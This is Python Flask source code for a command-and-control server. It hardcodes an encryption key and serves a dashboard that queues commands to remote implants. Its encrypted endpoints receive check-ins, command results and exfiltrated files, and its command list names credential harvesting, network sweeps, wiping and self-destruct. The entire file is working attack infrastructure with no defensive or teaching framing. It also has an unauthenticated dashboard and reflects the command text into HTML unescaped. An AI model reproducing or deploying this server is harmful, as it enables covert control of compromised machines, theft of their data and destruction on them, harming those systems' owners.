from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import os
import uuid
import json

app = Flask(__name__)

# --- CRYPTO SETUP --- #
MASTER_KEY = b"V9TcZqQXfTm53ri9vPoybLjQN0m0jtrFh09QXRZCi_s="
cipher = Fernet(MASTER_KEY)

# --- STATE --- #
commandQ = []
tasks = {}
inProgress = {}
results = []
allowedCommands = ["whoami", "hostname", "pwd", "shutdown", "wipe", "bash", "read", "write", "execute", "full_chain", "network_sweep", "credential_harvest", "self_destruct"]

# --- ENDPOINTS --- #
@app.route("/")
def home():
    html = "<h1>C2 Dashboard</h1>"
    
    # Command Submission Form
    html += "<h2>Send Command</h2>"
    html += "<form action='/add_command' method='GET'>"
    html += "<input type='text' name='cmd' placeholder='whoami' style='width:300px; padding:5px;' autofocus>"
    html += "<button type='submit' style='padding:5px;'>Queue</button>"
    html += "</form>"
    
    # Pending Queue
    html += "<h2>Pending Queue</h2>"
    if commandQ:
        html += "<ul>" + "".join(f"<li>{cmd}</li>" for cmd in commandQ) + "</ul>"
    else:
        html += "<p><i>Empty</i></p>"

    # Tasks In Progress
    html += "<h2>Tasks In Progress</h2>"
    if inProgress:
        html += "<ul>" + "".join(f"<li>{cmd} <small>(ID: {tid})</small></li>" for tid, cmd in inProgress.items()) + "</ul>"
    else:
        html += "<p><i>None</i></p>"
        
    # Results Log
    html += "<h2>Execution Results</h2>"
    if not results:
        html += "<p><i>No results yet</i></p>"
    for r in reversed(results):
        html += f"<h3>{r.get('cmd', 'Unknown')} <small>(Task {r.get('taskID', 'N/A')})</small></h3>"
        html += f"<pre style='background:#222; color:#0f0; padding:15px; border-radius:5px; overflow-x:auto;'>{r.get('output', '')}</pre>"
        
    return html

@app.route("/checkin", methods=["POST"])
def checkin():
    try:
        token = request.get_data().decode('utf-8').strip()
        decrypted = cipher.decrypt(token.encode('utf-8'))
        data = json.loads(decrypted)
        print("[+] Check-in received:", data)
        results.append({"cmd": "checkin", "taskID": "SYSTEM", "output": f"Check-in from host: {data.get('host', 'Unknown')}"})
        return "OK"
    except Exception as e:
        print(f"[-] Checkin error: {e}")
        return "ERROR", 400

@app.route("/command", methods=["GET"])
def command():
    if not commandQ:
        data = json.dumps({"status": "No Commands Queued"})
        return cipher.encrypt(data.encode('utf-8')).decode('utf-8')
        
    cmd = commandQ.pop(0)
    taskID = str(uuid.uuid4())[:8]
    tasks[taskID] = cmd
    inProgress[taskID] = cmd
    print(f'[+] Issuing task {taskID}: {cmd}')
    
    data = json.dumps({"taskID": taskID, "command": cmd})
    return cipher.encrypt(data.encode('utf-8')).decode('utf-8')

@app.route("/add_command", methods=["GET", "POST"])
def add_command():
    if request.method == "POST":
        data = request.json
        cmd = data.get("command")
    else:
        cmd = request.args.get("cmd")
        
    if not cmd:
        return jsonify({"error": "No command provided."}), 400

    commandQ.append(cmd)
    print(f'[+] Command added to queue: {cmd}')
    
    if request.method == "GET":
        return f"<h1>Command added: {cmd}</h1><p><a href='/'>Return to Dashboard</a></p><script>setTimeout(() => window.location.href='/', 1000);</script>"
    return jsonify({"status": "command added", "command": cmd})

@app.route("/result", methods=["POST"])
def result():
    try:
        token = request.get_data().decode('utf-8').strip()
        decrypted = cipher.decrypt(token.encode('utf-8'))
        data = json.loads(decrypted)
        
        taskID = data.get("taskID", "N/A")
        output = data.get("output", "")
        cmd = tasks.get(taskID, "initial_recon_or_unknown")
        print(f"[+] Result received for {taskID} {cmd}: {output}")
        
        if taskID in inProgress:
            del inProgress[taskID]
            
        results.append({"taskID": taskID, "cmd": cmd, "output": output})
        return "OK"
    except Exception as e:
        print(f"[-] Result error: {e}")
        return "ERROR", 400

@app.route("/exfil", methods=["POST"])
def exfil():
    try:
        token = request.get_data().decode('utf-8').strip()
        decrypted = cipher.decrypt(token.encode('utf-8'))
        data = json.loads(decrypted)
        
        filename = data.get("filename", "unknown_file")
        b64data = data.get("data", "")
        print(f"[+] Exfil received: {filename}")
        
        results.append({"taskID": "EXFIL", "cmd": f"exfil {filename}", "output": f"[Base64 Payload]\n{b64data}"})
        return "OK"
    except Exception as e:
        print(f"[-] Exfil error: {e}")
        return "ERROR", 400

# --- RUN --- #
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
